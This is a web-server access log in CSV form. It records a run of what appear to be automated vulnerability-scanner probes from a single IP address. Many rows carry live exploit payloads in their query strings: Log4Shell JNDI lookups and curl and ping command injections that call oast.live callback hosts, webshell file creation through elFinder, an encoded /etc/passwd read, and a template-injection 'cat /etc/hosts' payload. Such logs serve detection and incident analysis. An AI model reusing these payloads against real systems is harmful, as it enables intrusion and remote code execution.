"uri","query_string","request_ip","method"
"/appGet.cgi","hook=get_cfg_clientlist()","148.135.107.254","GET"
"/redfish/v1/SessionService/Sessions/","-","148.135.107.254","POST"
"/webtools/control/SOAPService","-","148.135.107.254","POST"
"/pages/createpage-entervariables.action","SpaceKey=x","148.135.107.254","POST"
"/pages/createpage-entervariables.action","-","148.135.107.254","POST"
"/nacos/v1/cs/configs","dataId=nacos.cfg.dataIdfoo&group=foo&content=helloWorld","148.135.107.254","POST"
"/index.php","-","148.135.107.254","POST"
"/service/v1/service-details","-","148.135.107.254","GET"
"/_ignition/execute-solution","-","148.135.107.254","POST"
"/","-","148.135.107.254","POST"
"/admin/index.php","p=ajax-ops&op=elfinder&cmd=mkfile&name=2Y3PONzdTVtx35sYa7yKtEC98Vg.php&target=l1_Lw","148.135.107.254","GET"
"/RPC2_Login","-","148.135.107.254","POST"
"/wp-login.php","-","148.135.107.254","POST"
"/wp-admin/admin-ajax.php","-","148.135.107.254","POST"
"/system/images/W1siZyIsICJjb252ZXJ0IiwgIi1zaXplIDF4MSAtZGVwdGggOCBncmF5Oi9ldGMvcGFzc3dkIiwgIm91dCJdXQ==","-","148.135.107.254","GET"
"/api/get_device_details","-","148.135.107.254","GET"
"/openam/oauth2/..;/ccversion/Version","-","148.135.107.254","GET"
"/Config/SaveUploadedHotspotLogoFile","-","148.135.107.254","POST"
"/dashboardUser","-","148.135.107.254","GET"
"/_ignition/execute-solution","-","148.135.107.254","POST"
"/wsman","-","148.135.107.254","POST"
"/_ignition/execute-solution","-","148.135.107.254","POST"
"/wp-admin/","-","148.135.107.254","GET"
"/assets/elFinder-2.1.9/elfinder.html","-","148.135.107.254","GET"
"/./RestAPI/LogonCustomization","-","148.135.107.254","POST"
"/oam/server/opensso/sessionservice","-","148.135.107.254","GET"
"/login/","-","148.135.107.254","GET"
"/wiki/pages/createpage-entervariables.action","-","148.135.107.254","POST"
"/_ignition/execute-solution","-","148.135.107.254","POST"
"/cobbler_api","-","148.135.107.254","POST"
"/v1/backend1","-","148.135.107.254","POST"
"/2Y3POf9qsNqJbKUF2odyqvLaOVG.php","cmd=sudo+rpm+--eval+%27%2525%7Blua%253aos.execute(%22curl+http%253a//cl82amo80ssu2h3kcjs0d6y9yut91gmjm.oast.live+-H+%27User-Agent%253a+tzpFmI%27%22)%7D%27","148.135.107.254","GET"
"/api/v1/login/oauth2/auth","-","148.135.107.254","POST"
"/sitecore/shell/ClientBin/Reporting/Report.ashx","-","148.135.107.254","POST"
"/backend/elfinder/elfinder-cke.html","-","148.135.107.254","GET"
"/cgi-bin/slogin/login.py","-","148.135.107.254","GET"
"/_ignition/execute-solution","-","148.135.107.254","POST"
"/RestAPI/ImportTechnicians","-","148.135.107.254","GET"
"/","-","148.135.107.254","GET"
"/elFinder/php/connector.minimal.php","cmd=mkfile&target=l1_Lw&name=2Y3POSWtZRpWdeFtTvg91rekxzn.php:aaa","148.135.107.254","GET"
"/cgi","7","148.135.107.254","POST"
"/client/index.php","-","148.135.107.254","GET"
"/lab.html","vpath=//interact.sh","148.135.107.254","GET"
"/","x=$%7Bjndi:ldap://$%7B:-639%7D$%7B:-510%7D.$%7BhostName%7D.uri.cl82amo80ssu2h3kcjs0rpa9cz6kdh7fh.oast.live/a%7D","148.135.107.254","GET"
"/v1/2Y3PNuxJ4SgJAl2GDajVgTbyq1r.php","-","148.135.107.254","GET"
"/goforms/menu","-","148.135.107.254","GET"
"/wan.htm","-","148.135.107.254","GET"
"/pages/createpage.action","spaceKey=myproj","148.135.107.254","POST"
"/uploads/assets/backend/elfinder/elfinder-cke.html","-","148.135.107.254","GET"
"/apisix/admin/migrate/export","-","148.135.107.254","GET"
"/images/icons_title.gif","-","148.135.107.254","GET"
"/images/icons_title.gif","-","148.135.107.254","DELETE"
"/api/ping/;%2560id%2560","-","148.135.107.254","GET"
"/images/icons_title.gif","-","148.135.107.254","GET"
"/formLoginAuth.htm","authCode=1&userName=admin&goURL&action=login","148.135.107.254","GET"
"/cgi-bin/export-cgi","category=config&arg0=startup-config.conf","148.135.107.254","GET"
"/login.htm","-","148.135.107.254","GET"
"/cgi-bin/admin.cgi","Command=sysCommand&Cmd=ping$%7BIFS%7D-c$%7BIFS%7D1$%7BIFS%7Dcl82amo80ssu2h3kcjs0tdat7jnwz3ua3.oast.live","148.135.107.254","GET"
"/","-","148.135.107.254","GET"
"/uploads/assets/backend/elfinder/elfinder.html","-","148.135.107.254","GET"
"/2Y3PNgt9vBLyO6vPmSC8SDhfOUg.txt","-","148.135.107.254","PUT"
"/2Y3PNgt9vBLyO6vPmSC8SDhfOUg.txt","-","148.135.107.254","GET"
"/wp-admin/admin-ajax.php","action=memberhero_send_form&_memberhero_hook=phpinfo","148.135.107.254","GET"
"/mgmt/tm/util/bash","-","148.135.107.254","POST"
"/wp-admin/admin-ajax.php","-","148.135.107.254","POST"
"/OA_CGI/FNDWRR.exe","-","148.135.107.254","GET"
"/template/custom/content-editor","-","148.135.107.254","POST"
"/userportal/Controller","mode=8700&operation=1&datagrid=179&json=%7B%22%25f0%259f%25a6%259e%22:%22test%22%7D","148.135.107.254","POST"
"/","-","148.135.107.254","GET"
"/templates/editor-preload-container","-","148.135.107.254","POST"
"/OA_HTML/BneViewerXMLService","bne:uueupload=TRUE","148.135.107.254","POST"
"/functionRouter","-","148.135.107.254","POST"
"/","-","148.135.107.254","GET"
"/pages/createpage-entervariables.action","-","148.135.107.254","POST"
"/pages/templates2/viewpagetemplate.action","-","148.135.107.254","POST"
"/2Y3PNgt9vBLyO6vPmSC8SDhfOUg.txt","-","148.135.107.254","GET"
"/catalog-portal/ui/oauth/verify","error&deviceUdid=%2524%257b%2522%2566%2572%2565%2565%256d%2561%2572%256b%2565%2572%252e%2574%2565%256d%2570%256c%2561%2574%2565%252e%2575%2574%2569%256c%2569%2574%2579%252e%2545%2578%2565%2563%2575%2574%2565%2522%253f%256e%2565%2577%2528%2529%2528%2522%2563%2561%2574%2520%252f%2565%2574%2563%252f%2568%256f%2573%2574%2573%2522%2529%257d","148.135.107.254","GET"
"/wp-admin/admin-ajax.php","action=wpt_admin_update_notice_option","148.135.107.254","POST"
"/uploads/elfinder/elfinder-cke.html","-","148.135.107.254","GET"
"/wp-json/am-member/license","-","148.135.107.254","POST"
"/wp-content/uploads/html2wp/2Y3PO4mzsNOmrNCQ34TBP5vEepO.php","-","148.135.107.254","GET"
"/wp-admin/admin.php","page=html2wp-settings","148.135.107.254","POST"
"/wp-admin/admin-ajax.php","action=easync_success_and_save","148.135.107.254","GET"
